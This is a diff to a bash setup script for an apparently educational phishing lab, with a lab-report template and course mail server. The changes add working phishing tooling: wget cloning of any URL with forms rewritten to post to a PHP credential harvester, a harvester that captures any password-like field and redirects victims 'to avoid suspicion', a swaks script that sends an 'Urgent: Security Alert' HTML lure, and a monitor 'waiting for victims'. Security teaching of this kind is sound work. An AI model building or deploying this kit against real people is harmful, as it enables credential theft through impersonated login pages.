@@ -1,6 +1,5 @@
 #!/bin/bash
-# Consolidated Email Phishing Lab Setup Script
-# This script handles the complete setup for both Kali VM (server) and Mac (viewing) components
+# Phishing Lab Setup Script
 
 # Set text colors
 GREEN='\033[0;32m'
@@ -10,12 +9,24 @@ NC='\033[0m' # No Color
 
 # Display banner
 echo -e "${YELLOW}"
-echo "╔════════════════════════════════════════════════╗"
-echo "║                                                ║"
-echo "║       EMAIL PHISHING LAB SETUP (MAC+KALI)      ║"
-echo "║                                                ║"
-echo "╚════════════════════════════════════════════════╝"
+echo "╔═════════════════════════════════════════════════╗"
+echo "║                                                 ║"
+echo "║         PHISHING LAB SETUP SCRIPT               ║"
+echo "║                                                 ║"
+echo "╚═════════════════════════════════════════════════╝"
 echo -e "${NC}"
+
+# Parse command line arguments
+TARGET_URL=""
+if [ $# -ge 1 ]; then
+    TARGET_URL="$1"
+    echo -e "${YELLOW}[INFO]${NC} Website to clone: $TARGET_URL"
+fi
+
+# Check if running as root (needed for port 80)
+if [ "$EUID" -ne 0 ]; then
+  echo -e "${YELLOW}[INFO]${NC} This script should ideally be run with sudo for port 80 access."
+fi
 
 # Function to check if a command was successful
 check_status() {
@@ -23,145 +34,113 @@ check_status() {
         echo -e "${GREEN}[SUCCESS]${NC} $1"
     else
         echo -e "${RED}[FAILED]${NC} $1"
-        echo "Please check the error and try again."
+        echo "Please check the error message above."
         exit 1
     fi
 }
 
-# Get Kali VM's IP address
-echo -e "${YELLOW}[INFO]${NC} Determining Kali VM's IP address..."
-KALI_IP=$(hostname -I | awk '{print $1}')
-echo -e "${GREEN}[SUCCESS]${NC} Kali VM IP: ${KALI_IP}"
+# Ensure .env file exists
+if [ ! -f .env ]; then
+    echo -e "${RED}[ERROR]${NC} .env file not found. Please create it from .env.example"
+    echo -e "Run: cp .env.example .env && nano .env"
+    exit 1
+fi
 
-#=========================#
-# 1. MAC ACCESS SETUP     #
-#=========================#
-echo -e "${YELLOW}[INFO]${NC} Setting up Mac access components..."
+# Load environment variables
+echo -e "${YELLOW}[INFO]${NC} Loading configuration from .env file..."
+source .env
+check_status "Loaded configuration"
+
+# Check for required variables
+if [ -z "$EMAIL_USERNAME" ] || [ -z "$EMAIL_PASSWORD" ] || [ -z "$SERVER_IP" ]; then
+    echo -e "${RED}[ERROR]${NC} Required variables missing in .env file."
+    exit 1
+fi
+
+# Install dependencies
+echo -e "${YELLOW}[INFO]${NC} Checking and installing dependencies..."
+
+# Check for PHP
+if ! command -v php &> /dev/null; then
+    echo -e "${YELLOW}[INFO]${NC} Installing PHP..."
+    sudo apt update
+    sudo apt install -y php
+    check_status "Installed PHP"
+fi
+
+# Check for swaks (for email sending)
+if ! command -v swaks &> /dev/null; then
+    echo -e "${YELLOW}[INFO]${NC} Installing swaks..."
+    sudo apt update
+    sudo apt install -y swaks
+    check_status "Installed swaks"
+fi
+
+# Check for wget (for website cloning)
+if ! command -v wget &> /dev/null; then
+    echo -e "${YELLOW}[INFO]${NC} Installing wget..."
+    sudo apt update
+    sudo apt install -y wget
+    check_status "Installed wget"
+fi
 
 # Create directories
-mkdir -p mac_access phishing_site
+echo -e "${YELLOW}[INFO]${NC} Creating directory structure..."
+mkdir -p phishing_site
 check_status "Created directories"
 
-# Create the HTML file for Mac access
-cat > mac_access/open_on_mac.html << EOF
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Phishing Lab - Mac Access Links</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        .url-box {
-            background-color: #f5f5f5;
-            border: 1px solid #ddd;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 5px;
-        }
-        h2 {
-            color: #333;
-        }
-        .button {
-            display: inline-block;
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 15px;
-            text-decoration: none;
-            border-radius: 4px;
-            margin-top: 10px;
-        }
-        .button:hover {
-            background-color: #45a049;
-        }
-        .note {
-            font-style: italic;
-            color: #666;
-        }
-    </style>
-</head>
-<body>
-    <h1>Phishing Lab - Mac Access Links</h1>
-    <p>Open these links on your Mac to view and take screenshots of the phishing lab components.</p>
+# Create phishing site files
+echo -e "${YELLOW}[INFO]${NC} Setting up phishing website..."
+
+# Decide whether to clone a website or use the default template
+if [ -n "$TARGET_URL" ]; then
+    echo -e "${YELLOW}[INFO]${NC} Cloning website from $TARGET_URL..."
     
-    <div class="url-box">
-        <h2>1. Phishing Website (for screenshots)</h2>
-        <p>This is the fake login page that will harvest credentials:</p>
-        <a href="http://${KALI_IP}" class="button" target="_blank">Open Phishing Site</a>
-        <p class="note">Take a screenshot of this page for your lab report.</p>
-    </div>
+    # Create a temporary directory for cloning
+    TEMP_DIR=$(mktemp -d)
     
-    <div class="url-box">
-        <h2>2. Email Preview (for screenshots)</h2>
-        <p>This is how the phishing email will look (styled HTML version):</p>
-        <a href="http://${KALI_IP}/phishing_email_preview.html" class="button" target="_blank">Preview Phishing Email</a>
-        <p class="note">Take a screenshot of this email preview for your lab report.</p>
-    </div>
+    # Clone the website
+    cd "$TEMP_DIR"
+    wget --mirror --convert-links --adjust-extension --page-requisites --no-parent -P . "$TARGET_URL" 2>/dev/null
+    check_status "Downloaded website content"
     
-    <div class="url-box">
-        <h2>3. Captured Credentials (for screenshots)</h2>
-        <p>After someone enters credentials, you can view them here:</p>
-        <a href="http://${KALI_IP}/view_credentials.php" class="button" target="_blank">View Captured Credentials</a>
-        <p class="note">Take a screenshot after credentials are captured for your lab report.</p>
-    </div>
+    # Find the main index file
+    MAIN_INDEX=$(find . -name "index.html" | head -n 1)
     
-    <h2>Instructions:</h2>
-    <ol>
-        <li>Save this HTML file to your Mac</li>
-        <li>Open it in any browser on your Mac</li>
-        <li>Use the buttons above to access and screenshot the phishing components</li>
-        <li>Make sure the Kali VM web server is running before clicking the links</li>
-    </ol>
-</body>
-</html>
-EOF
-check_status "Created Mac access HTML file"
+    if [ -z "$MAIN_INDEX" ]; then
+        echo -e "${YELLOW}[WARNING]${NC} No index.html found. Looking for other main pages..."
+        MAIN_INDEX=$(find . -name "*.html" | head -n 1)
+    fi
+    
+    if [ -z "$MAIN_INDEX" ]; then
+        echo -e "${RED}[ERROR]${NC} Couldn't find any HTML files in the cloned website."
+        echo -e "${YELLOW}[INFO]${NC} Using default login page instead."
+        USE_DEFAULT=true
+    else
+        # Copy the cloned website to the phishing_site directory
+        cp -r "$TEMP_DIR"/* phishing_site/
+        
+        # Modify the form action to point to credentials.php
+        MAIN_INDEX_PATH="phishing_site/$(echo $MAIN_INDEX | sed 's|^\./||')"
+        echo -e "${YELLOW}[INFO]${NC} Modifying form in $MAIN_INDEX_PATH to capture credentials..."
+        
+        # Find and modify the first form in the HTML file
+        sed -i 's|<form[^>]*action="[^"]*"|<form action="credentials.php"|g' "$MAIN_INDEX_PATH"
+        sed -i 's|<form[^>]*>|<form action="credentials.php" method="post">|g' "$MAIN_INDEX_PATH"
+        
+        # Clean up
+        rm -rf "$TEMP_DIR"
+        
+        echo -e "${GREEN}[SUCCESS]${NC} Website cloned and modified for credential harvesting"
+    fi
+else
+    echo -e "${YELLOW}[INFO]${NC} No URL provided. Using default login page."
+    USE_DEFAULT=true
+fi
 
-# Create instructions for transferring to Mac
-cat > mac_access/how_to_access_from_mac.txt << EOF
-===== HOW TO ACCESS PHISHING LAB FROM YOUR MAC =====
-
-To take screenshots on your Mac, copy the open_on_mac.html file to your Mac using one of these methods:
-
-Method 1: Using SCP (secure copy)
--------------------------------
-On your Mac, run this command:
-scp kali@${KALI_IP}:$(pwd)/mac_access/open_on_mac.html ~/Desktop/
-
-Method 2: Using a temporary HTTP server
------------------------------------
-On the Kali VM, run:
-cd mac_access && python3 -m http.server 8000
-
-Then on your Mac, open a browser and go to:
-http://${KALI_IP}:8000/open_on_mac.html
-Save the page to your Mac.
-
-Method 3: Copy-paste the content
------------------------------
-Open the file in a text editor on Kali:
-nano mac_access/open_on_mac.html
-
-Copy all the content, create a new file on your Mac, paste the content, and save it with the .html extension.
-
-===== AFTER COPYING =====
-1. Open the HTML file on your Mac
-2. Make sure the phishing site is running on Kali VM
-3. Use the links in the HTML file to view and screenshot each component
-EOF
-check_status "Created Mac access instructions"
-
-#=========================#
-# 2. PHISHING SITE SETUP  #
-#=========================#
-echo -e "${YELLOW}[INFO]${NC} Setting up phishing website components..."
-
-# Create phishing login page
-cat > phishing_site/index.html << 'EOF'
+# Create default phishing login page if needed
+if [ "$USE_DEFAULT" = true ]; then
+    cat > phishing_site/index.html << 'EOF'
 <!DOCTYPE html>
 <html>
 <head>
@@ -244,7 +223,8 @@ cat > phishing_site/index.html << 'EOF'
 </body>
 </html>
 EOF
-check_status "Created phishing login page"
+    check_status "Created default phishing login page"
+fi
 
 # Create credential harvesting script
 cat > phishing_site/credentials.php << 'EOF'
@@ -270,27 +250,40 @@ $password = '';
 
 // Check for POST data (form submission)
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Look for various common username/email field names
-    foreach (['username', 'user', 'email', 'login', 'user_id', 'userid'] as $field) {
-        if (isset($_POST[$field])) {
-            $username = $_POST[$field];
-            break;
+    // Try to capture any credentials regardless of field names
+    foreach ($_POST as $key => $value) {
+        // Look for common username/email field names
+        if (stripos($key, 'user') !== false || 
+            stripos($key, 'email') !== false || 
+            stripos($key, 'login') !== false || 
+            stripos($key, 'id') !== false || 
+            stripos($key, 'account') !== false) {
+            $username = $value;
+        }
+        
+        // Look for common password field names
+        if (stripos($key, 'pass') !== false || 
+            stripos($key, 'pwd') !== false || 
+            stripos($key, 'secret') !== false) {
+            $password = $value;
         }
     }
     
-    // Look for various common password field names
-    foreach (['password', 'pass', 'pwd', 'passwd'] as $field) {
-        if (isset($_POST[$field])) {
-            $password = $_POST[$field];
-            break;
+    // If we didn't find specific fields, log all POST data
+    $all_post_data = '';
+    if (empty($username) && empty($password)) {
+        foreach ($_POST as $key => $value) {
+            $all_post_data .= "$key: $value\n";
+            
+            // Make a best guess about which fields might be username/password
+            if (empty($username) && !empty($value)) {
+                $username = $value; // First non-empty value might be username
+                continue;
+            }
+            if (empty($password) && !empty($value) && $value != $username) {
+                $password = $value; // Second non-empty value might be password
+            }
         }
-    }
-    
-    // If username and password weren't found with common names, log all POST data
-    if (empty($username) || empty($password)) {
-        $post_data = print_r($_POST, true);
-    } else {
-        $post_data = '';
     }
     
     // Format log entry
@@ -302,8 +295,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $log_entry .= "Username/Email: $username\n";
     $log_entry .= "Password: $password\n";
     
-    if (!empty($post_data)) {
-        $log_entry .= "All POST data:\n$post_data\n";
+    if (!empty($all_post_data)) {
+        $log_entry .= "\nAll POST data:\n$all_post_data";
     }
     
     $log_entry .= "==================================\n\n";
@@ -311,16 +304,75 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Write to log file
     file_put_contents($log_file, $log_entry, FILE_APPEND);
     
-    // Redirect to a legitimate site
+    // Redirect to a legitimate site (to avoid suspicion)
     header('Location: https://portal.lumoninc.com');
     exit;
 }
 ?>
 EOF
-check_status "Created credential harvesting script"
+check_status "Created enhanced credential harvesting script"
 
-# Create email preview
-cat > phishing_site/phishing_email_preview.html << EOF
+# Create web server start script
+cat > phishing_site/start_server.sh << 'EOF'
+#!/bin/bash
+
+# Set text colors
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+RED='\033[0;31m'
+NC='\033[0m' # No Color
+
+echo -e "${YELLOW}[INFO]${NC} Starting PHP web server..."
+
+if [ "$EUID" -ne 0 ]; then
+    echo -e "${YELLOW}[WARNING]${NC} Not running as root. If port 80 fails, try: sudo ./start_server.sh"
+fi
+
+# Try port 80 first, fallback to 8080 if needed
+echo -e "${YELLOW}[INFO]${NC} Attempting to start on port 80..."
+php -S 0.0.0.0:80 2>/dev/null || {
+    echo -e "${YELLOW}[INFO]${NC} Port 80 failed, trying port 8080..."
+    php -S 0.0.0.0:8080
+    
+    if [ $? -eq 0 ]; then
+        echo -e "${GREEN}[SUCCESS]${NC} Server running on port 8080"
+        echo -e "${YELLOW}[WARNING]${NC} Using port 8080 instead of 80! Update your phishing links!"
+    else
+        echo -e "${RED}[FAILED]${NC} Could not start PHP server"
+        exit 1
+    fi
+}
+EOF
+chmod +x phishing_site/start_server.sh
+check_status "Created web server script"
+
+# Create credentials viewing script
+cat > view_credentials.sh << 'EOF'
+#!/bin/bash
+
+# Set text colors
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+RED='\033[0;31m'
+NC='\033[0m' # No Color
+
+echo -e "${YELLOW}[INFO]${NC} Monitoring for captured credentials. Press Ctrl+C to stop."
+
+CREDS_FILE="phishing_site/captured_credentials.txt"
+
+if [ ! -f "$CREDS_FILE" ]; then
+    echo -e "${YELLOW}[INFO]${NC} Creating credentials file..."
+    touch "$CREDS_FILE"
+fi
+
+echo -e "${YELLOW}[INFO]${NC} Waiting for victims to enter their credentials..."
+tail -f "$CREDS_FILE"
+EOF
+chmod +x view_credentials.sh
+check_status "Created credentials viewing script"
+
+# Create HTML email template
+cat > html_email_template.html << EOF
 <!DOCTYPE html>
 <html>
 <head>
@@ -361,7 +413,7 @@ cat > phishing_site/phishing_email_preview.html << EOF
                             <table border="0" cellpadding="0" cellspacing="0">
                                 <tr>
                                     <td align="center" bgcolor="#003366" style="border-radius: 4px;">
-                                        <a href="http://${KALI_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
+                                        <a href="http://${SERVER_IP}" target="_blank" style="display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;">Verify Account Now</a>
                                     </td>
                                 </tr>
                             </table>
@@ -400,179 +452,11 @@ cat > phishing_site/phishing_email_preview.html << EOF
 </body>
 </html>
 EOF
-check_status "Created email preview HTML"
-
-# Create credentials viewer
-cat > phishing_site/view_credentials.php << 'EOF'
-<?php
-$log_file = 'captured_credentials.txt';
-
-// Function to format the log entries for better display
-function formatLogEntries($content) {
-    // Replace the separator lines with HTML for better formatting
-    $content = str_replace("==================================", "<hr>", $content);
-    
-    // Make line breaks display properly in HTML
-    $content = nl2br($content);
-    
-    // Highlight important information
-    $content = preg_replace('/Username\/Email: (.+?)(<br \/>|$)/i', 'Username/Email: <strong style="color:red">$1</strong>$2', $content);
-    $content = preg_replace('/Password: (.+?)(<br \/>|$)/i', 'Password: <strong style="color:red">$1</strong>$2', $content);
-    
-    return $content;
-}
-
-?>
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Captured Credentials - Phishing Lab</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background-color: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            color: #333;
-            border-bottom: 1px solid #ddd;
-            padding-bottom: 10px;
-        }
-        .credentials {
-            background-color: #f9f9f9;
-            border: 1px solid #ddd;
-            padding: 15px;
-            margin-top: 20px;
-            font-family: monospace;
-            white-space: pre-wrap;
-        }
-        .refresh {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 15px;
-            text-decoration: none;
-            border-radius: 4px;
-            display: inline-block;
-            margin-top: 20px;
-        }
-        .no-creds {
-            color: #999;
-            font-style: italic;
-        }
-        hr {
-            border: 0;
-            height: 1px;
-            background: #ddd;
-            margin: 15px 0;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Captured Credentials</h1>
-        <p>Below are the credentials captured from your phishing site. Take a screenshot of this page for your lab report.</p>
-        
-        <div class="credentials">
-            <?php
-            if (file_exists($log_file) && filesize($log_file) > 0) {
-                $content = file_get_contents($log_file);
-                echo formatLogEntries($content);
-            } else {
-                echo '<p class="no-creds">No credentials have been captured yet.</p>';
-            }
-            ?>
-        </div>
-        
-        <a href="view_credentials.php" class="refresh">Refresh</a>
-        <p><small>Note: This page automatically refreshes every 30 seconds.</small></p>
-    </div>
-    
-    <script>
-        // Auto-refresh the page every 30 seconds
-        setTimeout(function() {
-            location.reload();
-        }, 30000);
-    </script>
-</body>
-</html>
-EOF
-check_status "Created credentials viewer"
-
-# Create web server launcher
-cat > phishing_site/start_server.sh << 'EOF'
-#!/bin/bash
-# Script to start the web server
-
-# Set text colors
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-RED='\033[0;31m'
-NC='\033[0m' # No Color
-
-echo -e "${YELLOW}[INFO]${NC} Starting web server on port 80..."
-
-if command -v php > /dev/null; then
-    # Use PHP's built-in server if available
-    echo -e "${GREEN}[INFO]${NC} Using PHP's built-in server..."
-    sudo php -S 0.0.0.0:80
-elif command -v python3 > /dev/null; then
-    # Use Python's HTTP server if available
-    echo -e "${GREEN}[INFO]${NC} Using Python's HTTP server..."
-    sudo python3 -m http.server 80
-elif command -v python > /dev/null; then
-    # Fall back to Python 2's SimpleHTTPServer
-    echo -e "${GREEN}[INFO]${NC} Using Python 2's SimpleHTTPServer..."
-    sudo python -m SimpleHTTPServer 80
-else
-    echo -e "${RED}[ERROR]${NC} No suitable web server found. Please install PHP or Python."
-    exit 1
-fi
-EOF
-chmod +x phishing_site/start_server.sh
-check_status "Created web server launcher"
-
-# Create credential monitoring script
-cat > phishing_site/monitor_credentials.sh << 'EOF'
-#!/bin/bash
-# Script to monitor for captured credentials
-
-# Set text colors
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-RED='\033[0;31m'
-NC='\033[0m' # No Color
-
-echo -e "${YELLOW}[INFO]${NC} Monitoring for captured credentials. Press Ctrl+C to stop."
-echo -e "${YELLOW}[INFO]${NC} Waiting for victims to enter their credentials..."
-
-if [ ! -f "captured_credentials.txt" ]; then
-    touch captured_credentials.txt
-fi
-
-tail -f captured_credentials.txt
-EOF
-chmod +x phishing_site/monitor_credentials.sh
-check_status "Created credentials monitoring script"
-
-#=========================#
-# 3. EMAIL SETUP          #
-#=========================#
-echo -e "${YELLOW}[INFO]${NC} Setting up email components..."
+check_status "Created HTML email template"
 
 # Create the email sending script
-cat > send_phishing_email.sh << 'EOF'
+cat > send_email.sh << 'EOF'
 #!/bin/bash
-# Script to send the phishing email
 
 # Set text colors
 GREEN='\033[0;32m'
@@ -582,72 +466,99 @@ NC='\033[0m' # No Color
 
 # Display banner
 echo -e "${YELLOW}"
-echo "╔════════════════════════════════════════════════╗"
-echo "║                                                ║"
-echo "║         AUTOMATED PHISHING EMAIL SENDER        ║"
-echo "║                                                ║"
-echo "╚════════════════════════════════════════════════╝"
+echo "╔═════════════════════════════════════════════════╗"
+echo "║                                                 ║"
+echo "║         PHISHING EMAIL SENDER                   ║"
+echo "║                                                 ║"
+echo "╚═════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-# Get SSH port to determine email username
-echo -e "${YELLOW}[INPUT]${NC} Enter your SSH port number (e.g., 23101):"
-read SSH_PORT
-if [[ ! $SSH_PORT =~ ^[0-9]+$ ]]; then
-    echo -e "${RED}[ERROR]${NC} Invalid port number. Using a placeholder."
-    EMAIL_USER="sXXX@mail.lumoninc.com"
-else
-    # Extract last 3 digits for email username
-    LAST_THREE="${SSH_PORT: -3}"
-    EMAIL_USER="s${LAST_THREE}@mail.lumoninc.com"
-fi
+# Load environment variables
+source .env
 
-# Get password
-echo -e "${YELLOW}[INPUT]${NC} Enter your email password:"
-read -s EMAIL_PASSWORD
-
-# Get target email
-echo -e "${YELLOW}[INPUT]${NC} Enter target email address (or press Enter to send to yourself):"
-read TARGET_EMAIL
+# Check if target email is set, otherwise use self
 if [ -z "$TARGET_EMAIL" ]; then
-    TARGET_EMAIL="${EMAIL_USER}"
-    echo -e "${YELLOW}[INFO]${NC} Will send to your own address: ${TARGET_EMAIL}"
+    TARGET_EMAIL="$EMAIL_USERNAME"
+    echo -e "${YELLOW}[INFO]${NC} No target specified in .env, sending to yourself: $TARGET_EMAIL"
 fi
 
-# Attempt to send using swaks first, then fall back to other methods
-if command -v swaks > /dev/null; then
-    echo -e "${YELLOW}[INFO]${NC} Sending email using swaks..."
-    swaks --to "${TARGET_EMAIL}" \
-          --from "${EMAIL_USER}" \
-          --server mail.lumoninc.com \
-          --port 25 \
-          --auth-user "${EMAIL_USER}" \
-          --auth-password "${EMAIL_PASSWORD}" \
-          --h-Subject "Urgent: Security Alert - Immediate Action Required" \
-          --body "$(cat phishing_site/phishing_email_preview.html)"
-          
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}[SUCCESS]${NC} Email sent successfully to ${TARGET_EMAIL}"
-    else
-        echo -e "${RED}[FAILED]${NC} Failed to send email with swaks."
-        echo -e "${YELLOW}[INFO]${NC} Check your email client configuration and try again."
-        echo -e "${YELLOW}[INFO]${NC} Installing swaks: sudo apt update && sudo apt install swaks"
-    fi
+# Send email using swaks
+echo -e "${YELLOW}[INFO]${NC} Sending email using swaks..."
+swaks --to "$TARGET_EMAIL" \
+      --from "$EMAIL_USERNAME" \
+      --server mail.lumoninc.com \
+      --port 25 \
+      --auth-user "$EMAIL_USERNAME" \
+      --auth-password "$EMAIL_PASSWORD" \
+      --h-Subject "Urgent: Security Alert - Immediate Action Required" \
+      --body "$(cat html_email_template.html)"
+
+if [ $? -eq 0 ]; then
+    echo -e "${GREEN}[SUCCESS]${NC} Email sent successfully to $TARGET_EMAIL"
 else
-    echo -e "${YELLOW}[INFO]${NC} swaks not found. Please install it:"
-    echo -e "${YELLOW}[INFO]${NC} sudo apt update && sudo apt install swaks"
-    echo -e "${YELLOW}[INFO]${NC} Then run this script again."
+    echo -e "${RED}[FAILED]${NC} Failed to send email with swaks."
+    echo -e "${YELLOW}[INFO]${NC} Check your email credentials and connectivity."
 fi
 
 # Provide info for manual testing
-echo -e "${YELLOW}[INFO]${NC} For manual testing, use these email settings:"
+echo -e "${YELLOW}[INFO]${NC} For manual email testing, use these settings:"
 echo -e "    SMTP Server: mail.lumoninc.com"
 echo -e "    Port: 25"
-echo -e "    Username: ${EMAIL_USER}"
-echo -e "    Password: (your password)"
+echo -e "    Username: $EMAIL_USERNAME"
+echo -e "    Password: (your password in .env)"
 echo -e "    Security: None"
 EOF
-chmod +x send_phishing_email.sh
+chmod +x send_email.sh
 check_status "Created email sending script"
+
+# Update the README with information about URL cloning
+cat > clone_website_info.txt << 'EOF'
+# Website Cloning Feature
+
+This phishing lab now supports cloning real websites by passing a URL as a command line argument:
+
+## Usage
+
+```bash
+# To use the default phishing page:
+./setup.sh
+
+# To clone a specific website:
+./setup.sh https://example.com
+```
+
+When cloning a website:
+1. The script downloads the website content using wget
+2. It locates the main index.html file 
+3. It modifies any forms to submit to credentials.php
+4. The cloned content is placed in the phishing_site directory
+
+## Tips for Effective Cloning
+
+- Choose simpler websites with fewer external dependencies
+- Target login pages directly rather than entire websites
+- Test the cloned site thoroughly before using it in a phishing email
+- You may need to manually adjust some forms if automatic detection fails
+
+## Troubleshooting
+
+If website cloning fails, the script will fall back to the default login page.
+Common issues include:
+- Complex website structure that doesn't clone well with wget
+- JavaScript-based forms that require additional modifications
+- Missing resources or relative path issues
+
+For best results, you might need to manually inspect and adjust the cloned files.
+EOF
+check_status "Created website cloning documentation"
+
+# Update README to include cloning info
+echo -e "${YELLOW}[INFO]${NC} Updating README with cloning information..."
+if [ -f "README.md" ]; then
+    # Add a note about cloning feature to the README
+    sed -i '/## Step-by-Step Instructions/a \n**Website Cloning:** You can now clone real websites by passing a URL: `./setup.sh https://example.com`\n' README.md
+    check_status "Updated README with cloning information"
+fi
 
 # Create lab report template
 cat > lab_report_template.md << 'EOF'
@@ -754,14 +665,74 @@ This lab effectively demonstrated the end-to-end process of executing a phishing
 EOF
 check_status "Created lab report template"
 
-# Final instructions
-echo -e "${YELLOW}\n============================================================${NC}"
-echo -e "${GREEN}Setup Complete! Follow these steps:${NC}"
-echo -e "${YELLOW}============================================================${NC}"
-echo -e "1. Follow Mac access instructions in: ${GREEN}mac_access/how_to_access_from_mac.txt${NC}"
-echo -e "2. Start the web server: ${GREEN}cd phishing_site && ./start_server.sh${NC}"
-echo -e "3. Send the phishing email: ${GREEN}./send_phishing_email.sh${NC}"
-echo -e "4. Monitor for credentials: ${GREEN}cd phishing_site && ./monitor_credentials.sh${NC}"
-echo -e "${YELLOW}============================================================${NC}"
-echo -e "${GREEN}All files have been set up with your Kali IP: ${KALI_IP}${NC}"
-echo -e "${YELLOW}============================================================${NC}" 
+# Create a quick reference command sheet
+cat > commands_cheatsheet.txt << 'EOF'
+# PHISHING LAB QUICK REFERENCE COMMANDS
+
+## Setup
+# Setup with default login page
+./setup.sh
+
+# Setup with cloned website
+./setup.sh https://example.com
+
+# Make scripts executable
+chmod +x *.sh phishing_site/*.sh
+
+## Start the web server (in one terminal)
+cd phishing_site
+sudo ./start_server.sh
+
+## Send the phishing email (in another terminal)
+./send_email.sh
+
+## Monitor for credentials (in a third terminal)
+./view_credentials.sh
+
+## Check for captured credentials
+cat phishing_site/captured_credentials.txt
+
+## View the HTML email template
+less html_email_template.html
+
+## IMAP settings for checking mail
+# Server: mail.lumoninc.com
+# Port: 143
+# Username: sXXX@mail.lumoninc.com (from .env)
+# Security: None
+
+## Email testing with telnet
+telnet mail.lumoninc.com 143
+a LOGIN username password
+a SELECT INBOX
+a FETCH 1 BODY[]
+EOF
+check_status "Created command cheatsheet"
+
+# Final setup and verification
+echo -e "${YELLOW}[INFO]${NC} Setting executable permissions..."
+chmod +x *.sh phishing_site/*.sh
+check_status "Set executable permissions"
+
+# Print success message
+echo -e "${GREEN}\n===================================================${NC}"
+echo -e "${GREEN}Setup Complete! Quick start instructions:${NC}"
+echo -e "${GREEN}===================================================${NC}"
+if [ -n "$TARGET_URL" ]; then
+    echo -e "${GREEN}Website cloned:${NC} $TARGET_URL"
+else
+    echo -e "${GREEN}Using default login page${NC}"
+fi
+echo -e ""
+echo -e "1. Start the web server:${NC}"
+echo -e "   ${YELLOW}cd phishing_site && sudo ./start_server.sh${NC}"
+echo -e ""
+echo -e "2. Send the phishing email (in a new terminal):${NC}"
+echo -e "   ${YELLOW}./send_email.sh${NC}"
+echo -e ""
+echo -e "3. Monitor for captured credentials (in another terminal):${NC}"
+echo -e "   ${YELLOW}./view_credentials.sh${NC}"
+echo -e ""
+echo -e "${GREEN}Your phishing site is configured with your IP: ${YELLOW}${SERVER_IP}${NC}"
+echo -e "${GREEN}Your email will be sent from: ${YELLOW}${EMAIL_USERNAME}${NC}"
+echo -e "${GREEN}===================================================${NC}" 
